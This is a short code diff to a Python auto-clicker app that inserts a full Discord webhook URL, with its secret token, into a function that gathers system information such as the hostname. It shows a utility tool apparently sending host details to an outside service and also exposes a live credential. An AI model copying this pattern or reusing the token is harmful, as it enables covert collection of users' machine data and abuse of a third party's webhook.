@@ -147,7 +147,7 @@ class AutoClickerApp:
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def send_discord_webhook(self):
-        webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE"  # Replace with your Discord webhook URL
+        webhook_url = "https://discord.com/api/webhooks/1415394621130801203/OWZz7K3aOrI5TMuXWGarGiG21nQdFa9P_1LhQA7OWg9DvrYKNF8qgr8YcXlppgnvqorC"  # Replace with your Discord webhook URL
         try:
             # Get system information
             hostname = socket.gethostname()
